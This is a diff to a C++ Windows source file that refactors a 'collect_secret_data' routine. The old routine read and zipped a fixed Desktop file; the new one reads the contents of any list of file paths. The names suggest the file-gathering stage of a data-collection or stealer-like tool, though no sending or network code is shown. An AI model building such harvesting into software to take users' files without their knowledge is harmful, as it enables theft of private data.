@@ -1,15 +1,29 @@
 #include "scout.hpp"
 
 #define WIN32_LEAN_AND_MEAN
-#include <Windows.h>
+#include <windows.h>
 
 #include <filesystem>
 #include <fstream>
 #include <vector>
 
-#include <miniz.h>
-
 namespace {
+
+    std::optional<std::vector<std::byte>> read_file_bytes(const std::filesystem::path& path) {
+        std::ifstream file(path, std::ios::binary | std::ios::ate);
+        if (!file) return std::nullopt;
+
+        const std::streamsize size = file.tellg();
+        if (size <= 0) return std::nullopt;
+        file.seekg(0);
+
+        std::vector<std::byte> bytes(static_cast<std::size_t>(size));
+        if (!file.read(reinterpret_cast<char*>(bytes.data()), size)) {
+            return std::nullopt;
+        }
+
+        return bytes;
+    }
 
     std::string wide_to_utf8(std::wstring_view wstr) {
         if (wstr.empty()) return {};
@@ -82,57 +96,20 @@ namespace scoutreg {
         }
     }
 
-    std::optional<SecretData> collect_secret_data(const std::string& username) {
-        namespace fs = std::filesystem;
+    std::vector<SecretData> collect_secret_data(const std::vector<std::string>& paths) {
+        std::vector<SecretData> gathered;
+        gathered.reserve(paths.size());
 
-        const fs::path path = fs::path("C:\\Users\\") / username / "Desktop\\stats.txt";
-        const std::string filename_in_zip = "stats.txt";
-
-        std::ifstream file(path, std::ios::binary | std::ios::ate);
-        if (!file.is_open()) return std::nullopt;
-
-        const std::streamsize size = file.tellg();
-        if (size <= 0) return std::nullopt;
-        file.seekg(0);
-
-        std::vector<std::byte> file_bytes(static_cast<size_t>(size));
-        if (!file.read(reinterpret_cast<char*>(file_bytes.data()), size)) {
-            return std::nullopt;
+        for (const auto& path : paths) {
+            if (const auto bytes = read_file_bytes(path)) {
+                gathered.push_back(SecretData{
+                    .filename = std::filesystem::path(path).filename().string(),
+                    .content  = std::move(*bytes)
+                });
+            }
         }
 
-        mz_zip_archive zip{};
-        if (!mz_zip_writer_init_heap(&zip, 0, file_bytes.size() + 256)) {
-            return std::nullopt;
-        }
-
-        const bool added = mz_zip_writer_add_mem(
-            &zip,
-            filename_in_zip.c_str(),
-            file_bytes.data(),
-            file_bytes.size(),
-            MZ_BEST_COMPRESSION
-        );
-
-        if (!added) {
-            mz_zip_writer_end(&zip);
-            return std::nullopt;
-        }
-
-        void*  zip_buf  = nullptr;
-        size_t zip_size = 0;
-        if (!mz_zip_writer_finalize_heap_archive(&zip, &zip_buf, &zip_size)) {
-            mz_zip_writer_end(&zip);
-            return std::nullopt;
-        }
-
-        const auto* raw = static_cast<std::byte*>(zip_buf);
-        SecretData result{
-            .filename  = filename_in_zip,
-            .zip_bytes = std::vector<std::byte>(raw, raw + zip_size)
-        };
-
-        mz_zip_writer_end(&zip);
-        return result;
+        return gathered;
     }
 
 }
